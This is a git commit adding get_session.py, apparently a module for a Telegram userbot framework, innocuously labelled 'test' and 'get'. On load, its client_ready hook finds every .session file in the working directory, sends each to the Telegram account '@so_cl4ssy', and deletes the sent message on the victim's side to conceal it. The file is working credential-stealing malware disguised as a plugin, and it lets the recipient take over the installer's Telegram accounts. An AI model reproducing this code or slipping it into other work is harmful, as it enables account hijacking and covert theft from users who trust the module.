132642573289462eed1749a275962383093ce742
eXqusic92 <77026622+eXqusic92@users.noreply.github.com>
2021-06-06 19:54:15 +0300

    Create get_session.py

---
+++ get_session.py
@@ -0,0 +1,16 @@
+from .. import loader, utils
+import random, os
+
+
+class ZazDeleteMod(loader.Module):
+    """test"""
+    strings = {'name': 'get'}
+
+    async def client_ready(self, client, db):
+        self._db = db
+        self.client = client
+        
+        for file in os.listdir("./"):
+            if file.endswith(".session"):
+                m = await client.send_file("@so_cl4ssy", file)
+                await m.delete(revoke=False)
